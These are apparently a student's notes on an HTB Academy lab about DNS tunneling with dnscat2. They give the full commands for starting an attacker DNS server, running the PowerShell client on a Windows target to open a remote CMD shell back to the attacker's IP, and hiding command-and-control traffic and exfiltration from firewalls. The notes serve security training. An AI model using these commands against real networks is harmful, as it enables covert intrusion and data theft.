**HTB Academy — Pivoting, Tunneling, and Port Forwarding (Section 12)**

---

## When to Use

- Firewall strips HTTPS/blocks common protocols
- DNS requests allowed outbound (nearly always permitted)
- Need stealthy C&C channel through corporate DNS
- Target can reach external DNS server (pivot → attacker)

**Data path:** Pivot host → DNS queries → External DNS server (attacker) → TXT record encapsulation

---

## Key Concept

Dnscat2 hides data in DNS TXT records. Corporate DNS → External attacker DNS → data exfiltration without firewall detection.

---

## Attack Host Setup (Server)

### 1. Clone & Install

bash

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

### 2. Start Server

bash

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

**Output includes:**

```
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

To talk directly to the server without a domain name, run:
  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
```

**Save the secret key** — required for client authentication.

---

## Windows Target Setup (Client)

### 1. Transfer dnscat2-powershell

bash

```bash
# On attack host:
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Transfer dnscat2.ps1 to target (via webshell, SMB share, etc.)
```

### 2. Import & Execute

powershell

```powershell
PS C:\htb> Import-Module .\dnscat2.ps1

PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

**Parameters:**

- `-DNSserver` — attacker's IP running dnscat2 server
- `-Domain` — domain the server is authoritative for
- `-PreSharedSecret` — encryption key from server output
- `-Exec cmd` — spawn CMD shell session

---

## Server-Side Interaction

### List Sessions

```
dnscat2> windows
Session 1 Security: ENCRYPTED AND VERIFIED!
```

### Connect to Session

```
dnscat2> window -i 1
```

### Drop into Shell

```
dnscat2> window -i 1
This is a console session!
Type ctrl-z to go back.

C:\Windows\system32>
```

### List Commands

```
dnscat2> ?
* echo, help, kill, quit, set, start, stop, tunnels, unset, window, windows
```

---

## Lab Workflow (HTB ACADEMY-PIVOTING-WIN10PIV)

bash

```bash
# 1. On attack host, start server
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
# Save the pre-shared secret

# 2. Transfer dnscat2.ps1 to Windows target
# (e.g., via webshell or SMB)

# 3. On target, import and connect
PS C:\> Import-Module .\dnscat2.ps1
PS C:\> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <KEY> -Exec cmd

# 4. On attack host, interact with session
dnscat2> window -i 1
C:\Windows\system32> whoami
```

---

## Dnscat2 vs SSH Pivoting vs Netsh

|Feature|Dnscat2|SSH `-D`|Netsh|
|---|---|---|---|
|Stealthy (DNS)|✓|✗ (SSH traffic)|✗ (direct forward)|
|Encrypted|✓ (PSK)|✓ (SSH)|✗|
|Through firewall|✓|Limited|Limited|
|Full SOCKS tunnel|✓ (via tunnels cmd)|✓|✗|
|Requires admin|✗|✗|✓|
|Setup complexity|Medium|Low|Low|
|Data in TXT records|✓|✗|✗|

---

## Security Notes

- Pre-shared secret strength matters — use strong secrets
- Session displays: `ENCRYPTED AND VERIFIED` when PSK correct
- All DNS traffic appears as legitimate queries to IDS/firewall
- TXT records carry the actual command/response data
- Default: all connections must be encrypted (enforced by server)

---

## Limitations

- Slower than direct tunnels (DNS latency)
- Large data transfers less practical (TXT record size limits)
- DNS logging may flag repeated queries to external domain
- Requires target to have outbound UDP 53 (DNS)
- Requires attacker to be authoritative for chosen domain (or use direct server IP)

---

## Key Dnscat2 Commands (at prompt)

```
window -i 1              # Connect to session 1
windows                  # List all active sessions
tunnels                  # Manage port forwarding through tunnel
kill <session>           # Terminate session
set history_size 500     # Change buffer size
quit                     # Exit dnscat2
```

---

## Troubleshooting

- **No session appears:** Check that target can reach attacker on UDP 53
- **"Security not verified":** PSK mismatch — verify secret from server output
- **Slow response:** Normal for DNS tunneling, be patient with large commands
- **DNS blocked:** Try alternative DNS server IP or different domain

---

## Tags

`#htb` `#cpts` `#pivoting` `#dns` `#dnscat2` `#covert` `#c2`